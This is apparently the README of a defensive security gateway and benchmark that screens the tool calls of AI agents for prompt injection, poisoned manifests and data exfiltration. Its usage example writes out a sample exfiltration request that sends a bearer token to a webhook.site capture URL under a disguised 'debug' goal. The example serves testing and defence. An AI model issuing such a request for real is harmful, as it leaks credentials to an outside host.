# MCP Sentinel Lab

[![CI](https://github.com/PRINCE2-AI/mcp-sentinel-lab/actions/workflows/ci.yml/badge.svg)](https://github.com/PRINCE2-AI/mcp-sentinel-lab/actions/workflows/ci.yml)
[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python&logoColor=white)](https://www.python.org/)
[![Agent Security](https://img.shields.io/badge/Agent%20Security-MCP%20Gateway-111827)](docs/threat_model.md)
[![OpenRouter Optional](https://img.shields.io/badge/OpenRouter-optional%20LLM%20explanations-7C3AED)](.env.example)
[![Live Demo](https://img.shields.io/badge/Live%20Demo-GitHub%20Pages-0B7285)](https://prince2-ai.github.io/mcp-sentinel-lab/)
[![License: MIT](https://img.shields.io/badge/License-MIT-2ea44f.svg)](LICENSE)
[![GitHub stars](https://img.shields.io/github/stars/PRINCE2-AI/mcp-sentinel-lab?style=social)](https://github.com/PRINCE2-AI/mcp-sentinel-lab/stargazers)

**A runtime security gateway and evaluation lab for MCP/tool-using AI agents.**

MCP Sentinel Lab protects agent tool calls before they touch files, networks, memory, or private data. It scans MCP-style tool manifests, pins trusted tool definitions, blocks prompt-injection and exfiltration patterns, redacts sensitive arguments, stores decision traces, and compares a naive baseline agent against a protected gateway.

> [!NOTE]
> This is a practical research-inspired engineering project, not an exact reproduction of AgentDojo, MCPTox, AgentCanary, SAFE-MCP, or any state-of-the-art security claim.

## Live Demo

- [Open the public demo](https://prince2-ai.github.io/mcp-sentinel-lab/)
- [Read the demo guide](docs/demo.md)
- [View CI proof](https://github.com/PRINCE2-AI/mcp-sentinel-lab/actions)

The public demo is intentionally read-only and does not use an API key. It shows the deterministic offline benchmark, attack cases, policy decisions, and proof links.

## See It In Action

```text
$ python -m app.cli demo

baseline agent:   allows every tool call
sentinel gateway: blocks workspace escape, credential exfiltration,
                  poisoned tool manifests, prompt injection,
                  memory poisoning, and cross-tool leakage

Result:
  baseline attack success:   100%
  protected attack success:  0%
  leakage block rate:        100%
  false block rate:          0%
  policy coverage:           100%
```

Live API explanation with OpenRouter/OpenAI configured:

```powershell
python -m app.simple_api --port 8000

Invoke-RestMethod -Uri "http://127.0.0.1:8000/llm/status" -Method Get |
  ConvertTo-Json -Depth 10
```

Expected live status:

```json
{
  "configured": true,
  "model": "openrouter/free",
  "ok": true,
  "provider": "openrouter",
  "response_preview": "API_OK"
}
```

## Why MCP Sentinel Lab

Modern agents are no longer text-only systems. They call tools that can read files, make network requests, write memory, and move data across trust boundaries. A malicious prompt, poisoned tool description, or unsafe tool argument can turn a helpful assistant into a data-exfiltration path.

MCP Sentinel Lab makes this failure mode visible and measurable:

- **Runtime gateway:** every tool call is evaluated before execution.
- **MCP manifest scanner:** risky descriptions, broad schemas, hidden instructions, and privileged capabilities are flagged.
- **Tool pinning:** manifest hashes catch tool drift and rug-pull behavior.
- **Policy engine:** deterministic allow/block/approval decisions with reasons.
- **Privacy guard:** API keys, bearer tokens, emails, and sensitive file paths are detected and redacted.
- **Evaluation bench:** naive allow-all agent behavior is compared against protected gateway behavior.
- **Observability:** API responses include risk level, matched rules, reasons, redacted arguments, and latency-friendly traces.
- **Optional LLM explanations:** OpenRouter/OpenAI can turn deterministic policy decisions into readable security explanations.

## Architecture

```mermaid
flowchart LR
    A["Agent tool request"] --> M["Manifest scanner"]
    M --> P["Tool pin store"]
    A --> G["Sentinel gateway"]
    P --> G
    G --> R["Policy engine"]
    G --> S["Privacy guard"]
    R --> D{"Decision"}
    S --> D
    D -->|allow| T["Tool execution boundary"]
    D -->|block| B["Blocked response"]
    D -->|approval| H["Human approval path"]
    D --> E["Trace store + metrics"]
    E --> V["Evaluation dashboard"]
    L["OpenRouter/OpenAI explanation"] -. optional .-> D
```

The core loop is intentionally small enough to study:

1. Register or scan MCP-style tool manifests.
2. Pin trusted tool hashes and detect definition drift.
3. Receive a proposed tool call from an agent.
4. Run policy checks over tool name, user goal, arguments, destination, and manifest risk.
5. Redact sensitive data before returning the decision.
6. Store decision reasons for audit and evaluation.

## Quick Start

### 1. Clone And Install

```bash
git clone https://github.com/PRINCE2-AI/mcp-sentinel-lab.git
cd mcp-sentinel-lab
python -m venv .venv
```

Windows PowerShell:

```powershell
.\.venv\Scripts\Activate.ps1
pip install -r requirements.txt
Copy-Item .env.example .env
```

macOS/Linux:

```bash
source .venv/bin/activate
pip install -r requirements.txt
cp .env.example .env
```

### 2. Run The Offline Demo

```powershell
python -m app.cli demo
```

The offline demo does not require an API key.

### 3. Run The API

With FastAPI:

```powershell
uvicorn app.api:app --reload
```

No-dependency fallback API:

```powershell
python -m app.simple_api --port 8000
```

### 4. Test One Tool Call

```powershell
$body = @{
  tool_name = "http.fetch"
  user_goal = "Send debug headers to monitoring."
  arguments = @{
    url = "https://webhook.site/capture"
    headers = @{
      Authorization = "Bearer sk-testSECRETKEY123456789"
    }
  }
} | ConvertTo-Json -Depth 5

Invoke-RestMethod `
  -Uri "http://127.0.0.1:8000/gateway/explain" `
  -Method Post `
  -ContentType "application/json" `
  -Body $body | ConvertTo-Json -Depth 10
```

## API Endpoints

| Endpoint | Method | Purpose |
| --- | --- | --- |
| `/health` | GET | Check server status and whether live LLM mode is configured |
| `/llm/status` | GET | Verify OpenRouter/OpenAI connectivity without exposing secrets |
| `/scan` | GET | Return manifest scan reports for bundled demo tools |
| `/evaluate` | GET | Return baseline vs protected evaluation metrics |
| `/gateway/decide` | POST | Return a deterministic gateway decision |
| `/gateway/explain` | POST | Return the decision plus optional LLM-generated explanation |

## Demo Results

The included benchmark contains benign local reads plus attacks for workspace escape, credential exfiltration, poisoned tool manifests, prompt injection, memory poisoning, and cross-tool exfiltration.

| Metric | Baseline Agent | Protected Gateway |
| --- | ---: | ---: |
| Attack success rate | 100% | 0% |
| Secret leakage block rate | 0% | 100% |
| False block rate | n/a | 0% |
| Policy coverage | n/a | 100% |
| Decision trace | none | stored with reasons |

These results are deterministic for the bundled cases and run offline. See [docs/evaluation.md](docs/evaluation.md) and [docs/demo.md](docs/demo.md).

## Research Basis

| Source | Used For |
| --- | --- |
| [AgentDojo](https://arxiv.org/abs/2406.13352) | Prompt-injection evaluation framing for tool-using agents |
| [MCPTox](https://arxiv.org/abs/2508.14925) | MCP tool poisoning and malicious tool description motivation |
| [AgentCanary / Agent3Sigma Canary](https://github.com/antgroup/Agent3Sigma-Canary) | Executable agent safety tasks and trajectory-style scoring ideas |
| [OWASP MCP Tool Poisoning](https://owasp.org/www-community/attacks/MCP_Tool_Poisoning) | Trust-boundary and tool-response poisoning risks |
| [SAFE-MCP](https://www.safemcp.org/) | MCP attack taxonomy and secure agentic framework ideas |
| [MCP client best practices](https://modelcontextprotocol.io/docs/develop/clients/client-best-practices) | Sandboxing, authorization, and cross-server data-flow guidance |
| [Invariant MCP-Scan](https://invariantlabs-ai.github.io/docs/mcp-scan/) | Differentiation from scanner-only tooling |

## Configuration

The project runs without an API key. Live explanations are optional.

```env
LLM_PROVIDER=openrouter
OPENROUTER_API_KEY=your_key_here
OPENROUTER_MODEL=openrouter/free

# Optional direct OpenAI-compatible settings.
OPENAI_API_KEY=
OPENAI_MODEL=gpt-4o-mini
```

Do not commit `.env`.

## Testing

The test suite is offline and does not require OpenRouter or OpenAI credentials:

```powershell
python -m unittest discover tests
```

Useful smoke checks:

```powershell
python -m app.cli demo
python scripts/smoke_api.py --base-url http://127.0.0.1:8000
```

GitHub Actions runs the regression suite on every push to `main`.

## Project Layout

```text
mcp-sentinel-lab/
|-- .github/workflows/ci.yml  # Offline CI test gate
|-- app/
|   |-- api.py                # FastAPI endpoints
|   |-- simple_api.py         # No-dependency HTTP API fallback
|   |-- attacks.py            # Built-in attack cases and sample manifests
|   |-- cli.py                # Command-line interface
|   |-- config.py             # Environment-driven settings
|   |-- demo.py               # Demo runner
|   |-- evaluator.py          # Baseline vs protected evaluation
|   |-- gateway.py            # Runtime tool-call gateway and tool pinning
|   |-- llm.py                # Optional OpenRouter/OpenAI explanations
|   |-- metrics.py            # Evaluation metrics
|   |-- policy.py             # Runtime policy engine
|   |-- privacy.py            # Secret and sensitive-data detection
|   |-- scanner.py            # MCP manifest risk scanner
|   |-- schemas.py            # Core dataclasses and enums
|   |-- trace_store.py        # SQLite decision traces
|   `-- ui.py                 # Streamlit dashboard
|-- demo/
|   |-- requests.http         # Copy-ready API demo requests
|   `-- sample_outputs.json   # Expected demo output snapshot
|-- docs/
|   |-- architecture.md
|   |-- demo.md
|   |-- evaluation.md
|   |-- resume_bullets.md
|   |-- sources.md
|   `-- threat_model.md
|-- scripts/
|   |-- run_demo.py
|   `-- smoke_api.py
|-- tests/
|-- .env.example
|-- pyproject.toml
`-- requirements.txt
```

## Portfolio Pitch

MCP Sentinel Lab shows production-minded AI engineering beyond a chatbot:

- agent security and MCP/tool-call governance
- prompt-injection and tool-poisoning defense
- privacy-aware data-flow control
- deterministic evaluation with baseline comparison
- API, CLI, dashboard, tests, CI, docs, and live LLM explanation mode

Resume-ready bullets are available in [docs/resume_bullets.md](docs/resume_bullets.md).

## Roadmap

- [ ] Add real MCP proxy mode for live server mediation
- [ ] Add user approval workflow for medium-risk tool calls
- [ ] Add replayable trace viewer with attack timelines
- [ ] Add provider-specific policy templates for filesystem, browser, email, and database tools
- [ ] Add a public demo video and hosted read-only dashboard

## License

MCP Sentinel Lab is available under the [MIT License](LICENSE).
